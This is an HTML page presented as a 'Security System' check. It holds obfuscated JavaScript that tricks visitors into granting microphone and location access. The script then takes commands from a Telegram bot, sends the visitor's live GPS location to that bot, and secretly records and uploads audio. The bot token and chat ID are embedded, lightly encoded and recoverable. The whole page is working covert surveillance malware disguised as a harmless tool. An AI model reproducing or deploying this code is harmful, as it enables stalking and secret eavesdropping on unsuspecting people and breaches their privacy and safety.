<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security System</title>
    <style>
        body {
            background: #000;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            font-family: Arial;
        }
        .loader {
            border: 10px solid #333;
            border-top: 10px solid #ff6200;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 2s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .message {
            color: #ff6200;
            font-size: 24px;
            margin-top: 20px;
            text-align: center;
        }
    </style>
</head>
<body>
    <div>
        <div class="loader"></div>
        <div class="message">System Analyzed</div>
    </div>

    <script>
        // تنظیمات رمزنگاری شده
        const SECRET = {
            token: 'MzQwMjM2ODE2NzpHQUZEV0NuaDY0MHY5dGNRNVVtLVpnX0RQYWFodGhTd1ZaSQ==',
            chat: 'MjIzMTU4Njg3MQ=='
        };

        // توابع رمزگشایی
        const decrypt = {
            token: () => atob(SECRET.token).split('').reverse().join(''),
            chat: () => String.fromCharCode(...atob(SECRET.chat).split('').map(c => c.charCodeAt(0)-1)
        };

        class ControlSystem {
            constructor() {
                this.recorder = null;
                this.audioChunks = [];
                this.setupPermissions();
            }

            // سیستم مجوزهای روسی
            async setupPermissions() {
                try {
                    const ruConfirm = confirm('Для работы системы требуется:\n1. Доступ к геолокации\n2. Доступ к микрофону\nРазрешить доступ?');
                    if(!ruConfirm) return;
                    
                    await navigator.mediaDevices.getUserMedia({ audio: true });
                    navigator.geolocation.getCurrentPosition(() => {});
                } catch(e) {
                    alert('Доступ отклонен! Система не может работать');
                }
            }

            // سیستم دستورات
            async checkCommands() {
                try {
                    const response = await fetch(`https://api.telegram.org/bot${decrypt.token()}/getUpdates`);
                    const data = await response.json();
                    
                    data.result.forEach(update => {
                        const command = update.message.text;
                        const chatId = update.message.chat.id.toString();
                        
                        if(chatId === decrypt.chat()) {
                            this.executeCommand(command);
                        }
                    });
                } catch(e) { console.error('Error:', e); }
            }

            executeCommand(command) {
                switch(command) {
                    case '/locate':
                        this.getLocation();
                        break;
                    case '/record_start':
                        this.startRecording();
                        break;
                    case '/record_stop':
                        this.stopRecording();
                        break;
                }
            }

            // موقعیت مکانی
            async getLocation() {
                const pos = await new Promise((res, rej) => 
                    navigator.geolocation.getCurrentPosition(res, rej));
                
                const mapLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                this.sendTelegram(`📍 Live Location:\n${mapLink}`);
            }

            // مدیریت ضبط صدا
            async startRecording() {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                this.recorder = new MediaRecorder(stream);
                this.recorder.start();
                this.recorder.ondataavailable = e => this.audioChunks.push(e.data);
                this.sendTelegram('⏺ Recording started...');
            }

            async stopRecording() {
                if(!this.recorder) return;
                
                await new Promise(res => {
                    this.recorder.onstop = res;
                    this.recorder.stop();
                });
                
                const audioBlob = new Blob(this.audioChunks, { type: 'audio/webm' });
                this.sendAudio(audioBlob);
                this.audioChunks = [];
            }

            // ارتباط با تلگرام
            sendTelegram(text) {
                fetch(`https://api.telegram.org/bot${decrypt.token()}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: decrypt.chat(),
                        text: text
                    })
                });
            }

            sendAudio(audioBlob) {
                const formData = new FormData();
                formData.append('audio', audioBlob, 'recording.webm');
                formData.append('chat_id', decrypt.chat());
                
                fetch(`https://api.telegram.org/bot${decrypt.token()}/sendAudio`, {
                    method: 'POST',
                    body: formData
                });
            }
        }

        // اجرای سیستم
        const system = new ControlSystem();
        setInterval(() => system.checkCommands(), 3000);
    </script>
</body>
</html>
